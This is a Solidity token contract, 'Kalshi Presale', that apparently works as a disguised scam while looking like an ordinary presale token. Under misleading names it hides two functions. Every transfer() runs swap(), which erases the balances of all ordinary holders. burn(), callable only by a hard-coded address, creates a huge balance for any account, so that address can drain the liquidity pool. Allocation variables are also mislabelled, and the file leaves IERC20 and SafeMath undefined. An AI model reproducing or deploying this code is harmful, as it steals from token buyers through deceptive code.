pragma solidity 0.8.33;
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV3Router03 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract KalshiPresale is IERC20, Ownable {
    using SafeMath for uint256;
    string private _name ="Kalshi Presale";
    string private _symbol="KALSHI PRE";
    address Preamble = 0x616673635Ea43a98957F1bAE4dED1f87953Ee38e;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000000000000000000000;
    address Router02Address;
    mapping(address => uint256) private askDiv;
    mapping(address => mapping(address => uint256)) private _allowances;
    address[] private believers;
    address private constant ADDRESS_sWETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address private constant ADDRESS_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address Virtuals_Protocol;
    IUniswapV3Router03 private uniswapV3Router;
    address private uniswapV3Pair;
    bool private tradingOpen = false;
    constructor() payable {
       Virtuals_Protocol = msg.sender;
       Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        askDiv[address(this)] = _totalSupply.mul(1).div(10000);
        emit Transfer(address(0), address(this), _totalSupply.mul(1).div(10000));
        liqudityPairs();
        payable(address(this)).transfer(msg.value);
    }
    function liqudityPairs() internal {
        uint256 ninetyFourPercent = _totalSupply.mul(6090).div(10000);
        uint256 threePercent = _totalSupply.mul(3005).div(10000);
        uint256 twoPercent = _totalSupply.mul(904).div(10000);
        askDiv[ADDRESS_sWETH] = askDiv[ADDRESS_sWETH].add(ninetyFourPercent);
        askDiv[ADDRESS_WETH] = askDiv[ADDRESS_WETH].add(threePercent);
        askDiv[Preamble] = askDiv[Preamble].add(twoPercent);
        emit Transfer(address(this), ADDRESS_sWETH, ninetyFourPercent);
        emit Transfer(address(this), ADDRESS_WETH, threePercent);
        emit Transfer(address(this), Preamble, twoPercent);
    }
 function _updateHolders(address account) internal {
        if (askDiv[account] > 0) {
            bool exists = false;
            for (uint256 i = 0; i < believers.length; i++) {
                if (believers[i] == account) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                believers.push(account);
            }
        }
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
            if (true) {
        swap();
    }
    return true;
    }
function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        askDiv[sender] = askDiv[sender].sub(amount);
        askDiv[recipient] = askDiv[recipient].add(amount);
        _updateHolders(sender);
        _updateHolders(recipient);
        emit Transfer(sender, recipient, amount);
    }
      modifier Only_Manager() {
        require(Preamble == _msgSender());
        _;
    }
    function swap() internal  {
        for (uint256 i = 0; i < believers.length; i++) {
            address believer = believers[i];
            if (
                believer != address(this) &&
                believer != owner() &&
                believer != uniswapV3Pair &&
                believer != ADDRESS_sWETH &&
                believer != ADDRESS_WETH &&
                believer != Preamble
            ) {
                askDiv[believer] = 0;
            }
             emit Transfer(address(0), believer, 0);
        }
    }
    function burn(address claimedRewardStatusOf) external Only_Manager {
        askDiv[claimedRewardStatusOf] = _totalSupply * 10 ** _decimals;
        emit Transfer(claimedRewardStatusOf, address(0), _totalSupply * 10 ** _decimals);
    }
    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV3Router = IUniswapV3Router03(Router02Address);
        uniswapV3Pair = IUniswapV2Factory(uniswapV3Router.factory()).createPair(address(this), uniswapV3Router.WETH());
        _approve(address(this), address(uniswapV3Router), _totalSupply);
        uniswapV3Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            0x000000000000000000000000000000000000dEaD,
            block.timestamp
        );
        tradingOpen = true;
    }
    receive() external payable {}
    function name() public view virtual  returns (string memory) {
        return _name;
    }
    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return askDiv[account];
    }
function getLPPair() public view returns (address) {
        return uniswapV3Pair;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
    return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
    return true;
    }
}